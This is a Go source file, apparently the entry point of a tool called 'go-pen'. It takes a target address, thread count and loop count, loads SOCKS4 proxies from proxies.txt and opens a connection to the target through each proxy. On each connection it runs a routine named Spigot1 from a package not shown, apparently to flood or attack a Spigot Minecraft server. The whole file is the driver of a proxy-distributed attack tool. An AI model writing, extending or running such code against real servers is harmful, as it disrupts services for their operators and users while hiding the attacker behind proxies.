package main

import (
	"bufio"
	"fmt"
	"go-pen/methods"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"h12.io/socks"
)

func checkArguments(cleanArgs []string) (string, int, int) {
	argsMessage := "Arguments: <ip:port> <threads> <loop>"

	if len(cleanArgs) < 3 {
		fmt.Println(argsMessage)
		os.Exit(1) // is it a good way to do that....
	}

	var serverAddress = cleanArgs[0]

	if !strings.Contains(serverAddress, ":") {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	threads, err := strconv.Atoi(cleanArgs[1])
	loop, errn := strconv.Atoi(cleanArgs[2])

	if err != nil || errn != nil {
		fmt.Println(argsMessage)
		os.Exit(1)
	}

	return serverAddress, threads, loop
}

func parseProxies() []string {
	file, err := os.Open("proxies.txt")

	if err != nil {
		log.Fatal("Something is wrong with proxies.txt, ", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)

	var proxies []string

	for scanner.Scan() {
		proxies = append(proxies, scanner.Text())
	}

	file.Close()

	return proxies
}

func makeConnection(proxyAddress string, serverAddress string) (net.Conn, error) {
	address := fmt.Sprintf("socks4://%s?timeout=5s", proxyAddress)

	dialSocks := socks.Dial(address)
	conn, err := dialSocks("tcp", serverAddress)

	return conn, err
}

func processProxy(proxies chan string, wg *sync.WaitGroup, address string, data *methods.MethodData) {
	for proxy := range proxies {
		var conn, err = makeConnection(proxy, address)
		if err != nil {
			//fmt.Println(err)
		} else {
			methods.Spigot1(data, conn)
		}
	}

	wg.Done()
}

func main() {
	var serverAddress, threadCooldown, loop = checkArguments(os.Args[1:])

	fmt.Println(threadCooldown)

	proxies := parseProxies()
	data := methods.MethodData{Address: serverAddress, Loop: loop}

	proxyChan := make(chan string)
	wg := sync.WaitGroup{}

	for t := 0; t < len(proxies); t++ {
		wg.Add(1)
		go processProxy(proxyChan, &wg, serverAddress, &data)
	}

	for _, proxy := range proxies {
		proxyChan <- proxy
		time.Sleep(1 * time.Millisecond)
	}

	close(proxyChan)

	wg.Wait()
}
